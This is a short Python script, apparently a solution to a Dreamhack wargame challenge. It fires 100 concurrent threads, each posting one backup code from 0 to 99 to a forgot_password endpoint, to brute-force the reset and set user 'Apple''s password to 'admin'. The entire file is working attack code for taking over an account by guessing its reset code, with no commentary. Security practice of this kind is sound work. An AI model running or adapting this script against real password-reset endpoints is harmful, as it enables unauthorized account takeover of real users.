from threading import Thread
import requests

backup_codes = range(100)

def run(code, results):
    url = 'http://host1.dreamhack.games:21893/forgot_password'
    data = {
        'userid': 'Apple',
        'newpassword': 'admin',
        'backupCode': code
    }
    print(code)
    res = requests.post(url, data=data)

    if 'Wrong' in res.text:
        pass
    else:
        print('Success!! Password Changed with Apple/admin')
        return

results = [None] * 100
for i in backup_codes:
    Thread(target=run, args=(i, results)).start()